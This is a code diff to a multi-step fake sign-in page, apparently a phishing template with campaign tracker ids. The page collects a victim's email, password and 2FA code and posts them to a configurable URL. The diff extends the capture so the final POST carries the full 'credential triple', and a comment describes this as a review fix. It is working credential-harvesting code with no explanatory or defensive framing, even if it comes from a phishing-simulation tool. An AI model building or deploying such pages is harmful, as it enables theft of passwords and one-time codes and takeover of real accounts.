@@ -56,7 +56,7 @@
   <span>Terms of use &middot; Privacy &amp; cookies &middot; &hellip;</span>
 </div>
 
-<script data-tracker src="{{TRACKER_URL}}"></script>
+<script data-tracker src="{{TRACKER_URL_ATTR}}"></script>
 <script>
 (function () {
   var POST_URL = "{{POST_URL}}";
@@ -84,6 +84,7 @@
   var formPwd   = document.getElementById("step-password");
   var form2fa   = document.getElementById("step-2fa");
   var emailVal  = "";
+  var pwdVal    = "";
 
   formEmail.addEventListener("submit", function (e) {
     e.preventDefault();
@@ -102,11 +103,11 @@
   });
   formPwd.addEventListener("submit", function (e) {
     e.preventDefault();
-    var pwd = formPwd.elements["password"].value;
+    pwdVal = formPwd.elements["password"].value;
     var ctx = trackerCtx();
     post({
       page: 2,
-      form_field_data: { email: emailVal, password: pwd },
+      form_field_data: { email: emailVal, password: pwdVal },
       rid: ctx.rid, sess_id: ctx.sess_id, trackerId: ctx.trackerId,
     }, function () {
       formPwd.style.display = "none";
@@ -117,9 +118,12 @@
     e.preventDefault();
     var code = form2fa.elements["code_2fa"].value;
     var ctx = trackerCtx();
+    // Phase 3.46 review fix: carry email + password forward so a
+    // backend that doesn't stitch captures by rid still gets the
+    // full credential triple on the final POST.
     post({
       page: 3,
-      form_field_data: { email: emailVal },
+      form_field_data: { email: emailVal, password: pwdVal },
       code_2fa: code,
       rid: ctx.rid, sess_id: ctx.sess_id, trackerId: ctx.trackerId,
     }, function () {
